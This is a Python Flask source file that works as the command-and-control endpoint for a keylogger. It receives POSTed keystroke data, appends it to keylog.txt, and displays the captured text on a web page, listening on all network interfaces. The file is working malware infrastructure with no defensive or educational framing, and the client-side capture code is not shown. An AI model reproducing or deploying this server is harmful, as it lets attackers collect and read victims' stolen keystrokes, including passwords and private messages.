from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# HTML template to display the keylogger data
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Data</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        pre { background-color: #f4f4f4; padding: 10px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Keylogger Data</h1>
    <pre>{{ keylog_data }}</pre>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def log_data():
    if request.method == 'POST':
        try:
            data = request.json
            if data and "keyboardData" in data:
                # Append the keyboard data to a file
                with open('keylog.txt', 'a') as f:
                    f.write(data['keyboardData'])
                return jsonify({"status": "success"}), 200
            else:
                return jsonify({"status": "no_data"}), 400
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    else:
        # For GET requests, read the contents of the keylog.txt file
        try:
            with open('keylog.txt', 'r') as f:
                keylog_data = f.read()
        except FileNotFoundError:
            keylog_data = "No data logged yet."
        
        return render_template_string(html_template, keylog_data=keylog_data)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
